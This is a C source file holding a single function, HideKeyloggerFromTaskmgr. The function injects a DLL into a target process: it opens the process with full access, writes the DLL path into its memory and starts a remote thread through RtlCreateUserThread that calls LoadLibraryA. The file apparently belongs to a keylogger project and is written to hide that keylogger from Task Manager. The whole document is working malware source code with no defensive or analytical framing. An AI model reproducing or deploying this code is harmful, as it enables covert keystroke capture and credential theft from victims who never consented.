#include "svc.h"


HANDLE HideKeyloggerFromTaskmgr(DWORD procID)
{
    char cwd[MAX_PATH];
    char *dllPath = NULL;
    HANDLE hThread;
    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, procID);
    if (procHandle == NULL) return NULL;
    GetCurrentDirectory((DWORD)MAX_PATH, (LPSTR)&cwd);
    size_t totalLenSvcBinPath = strlen(cwd) + (size_t)1 + strlen(DLL_NAME) + (size_t)1; 
    dllPath = malloc(totalLenSvcBinPath);
    if (dllPath == NULL) return NULL;
    strcpy_s(dllPath, totalLenSvcBinPath, cwd);
    strcat_s(dllPath, totalLenSvcBinPath, "\\");
    strcat_s(dllPath, totalLenSvcBinPath, DLL_NAME);
    LPVOID baseAddr = VirtualAllocEx(procHandle, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (baseAddr == NULL)
    {
        REEF(dllPath);
        return NULL;
    }
    WriteProcessMemory(procHandle, baseAddr, dllPath, strlen(dllPath) + 1, NULL);
    HMODULE ntdll=LoadLibrary("ntdll.dll");
    RtlCreateUserThread=(_RtlCreateUserThread)(LPVOID)GetProcAddress(ntdll,"RtlCreateUserThread");
    LPVOID loadLib = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    NTSTATUS status = RtlCreateUserThread(
        procHandle,
        NULL,
        FALSE,
        0,
        0,
        0,
        loadLib,
        baseAddr,
        &hThread,
        NULL
    );
    if (NT_SUCCESS(status) == 0)    printf("RtlCreateUserThread failed: 0x%08X\n", (unsigned int)status);
    REEF(dllPath);
    return hThread;
}